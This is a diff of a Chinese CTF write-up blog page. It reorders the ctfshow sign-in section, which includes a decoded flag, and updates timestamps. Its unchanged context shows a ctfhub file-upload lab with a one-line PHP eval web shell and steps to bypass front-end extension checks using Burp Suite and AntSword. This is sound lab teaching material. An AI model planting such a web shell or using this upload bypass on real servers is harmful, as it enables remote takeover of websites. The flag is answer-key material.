@@ -31,7 +31,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/04/15/web%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/ctfshow_web%E7%AD%BE%E5%88%B0%E9%A2%98.png">
 <meta property="article:published_time" content="2021-04-15T11:24:40.922Z">
-<meta property="article:modified_time" content="2021-04-15T13:01:14.298Z">
+<meta property="article:modified_time" content="2021-04-15T13:43:24.446Z">
 <meta property="article:author" content="wha1e">
 <meta property="article:tag" content="write up">
 <meta name="twitter:card" content="summary">
@@ -227,7 +227,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-04-15 19:24:40 / 修改时间：21:01:14" itemprop="dateCreated datePublished" datetime="2021-04-15T19:24:40+08:00">2021-04-15</time>
+              <time title="创建时间：2021-04-15 19:24:40 / 修改时间：21:43:24" itemprop="dateCreated datePublished" datetime="2021-04-15T19:24:40+08:00">2021-04-15</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -253,13 +253,8 @@
         <p>web题wp</p>
 <span id="more"></span>
 
-<h4 id="ctfshow之web"><a href="#ctfshow之web" class="headerlink" title="ctfshow之web"></a>ctfshow之web</h4><h5 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h5><p>直接F12查看源代码</p>
-<img src="/2021/04/15/web%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/ctfshow_web%E7%AD%BE%E5%88%B0%E9%A2%98.png" class>
 
-<p>获取</p>
-<p>Y3Rmc2hvd3s4ZTA4ZDUyZS1hNGNjLTQ1MWYtYmYwOC0wZjA4ZGI1MmUyMTR9</p>
-<p>使用base64解码，获取flag</p>
-<p>ctfshow{8e08d52e-a4cc-451f-bf08-0f08db52e214}</p>
+
 <h4 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h4><h5 id="文件上传–无验证"><a href="#文件上传–无验证" class="headerlink" title="文件上传–无验证"></a>文件上传–无验证</h5><p>编写一句话木马并上传</p>
 <?php
 
@@ -275,6 +270,13 @@ echo "123"; @eval(@$_POST['a']);
 <h5 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h5><p>右键查看源码，发现该网站只支持”jpg”、”png”、”gif”,所以将一句话木马后缀名添加”.jpg”上传</p>
 <p>burp suite抓包–&gt;将一句话木马后缀名恢复成”.php”，放包</p>
 <p>中国蚁剑同上</p>
+<h4 id="ctfshow之web"><a href="#ctfshow之web" class="headerlink" title="ctfshow之web"></a>ctfshow之web</h4><h5 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h5><p>直接F12查看源代码</p>
+<img src="/2021/04/15/web%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/ctfshow_web%E7%AD%BE%E5%88%B0%E9%A2%98.png" class>
+
+<p>获取</p>
+<p>Y3Rmc2hvd3s4ZTA4ZDUyZS1hNGNjLTQ1MWYtYmYwOC0wZjA4ZGI1MmUyMTR9</p>
+<p>使用base64解码，获取flag</p>
+<p>ctfshow{8e08d52e-a4cc-451f-bf08-0f08db52e214}</p>
 
     </div>
 
@@ -355,7 +357,7 @@ echo "123"; @eval(@$_POST['a']);
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#ctfshow%E4%B9%8Bweb"><span class="nav-number">1.</span> <span class="nav-text">ctfshow之web</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">web签到题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ctfhub"><span class="nav-number">2.</span> <span class="nav-text">ctfhub</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%93%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="nav-number">2.1.</span> <span class="nav-text">文件上传–无验证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">2.2.</span> <span class="nav-text">前端验证</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#ctfhub"><span class="nav-number">1.</span> <span class="nav-text">ctfhub</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%93%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="nav-number">1.1.</span> <span class="nav-text">文件上传–无验证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-number">1.2.</span> <span class="nav-text">前端验证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ctfshow%E4%B9%8Bweb"><span class="nav-number">2.</span> <span class="nav-text">ctfshow之web</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">web签到题</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
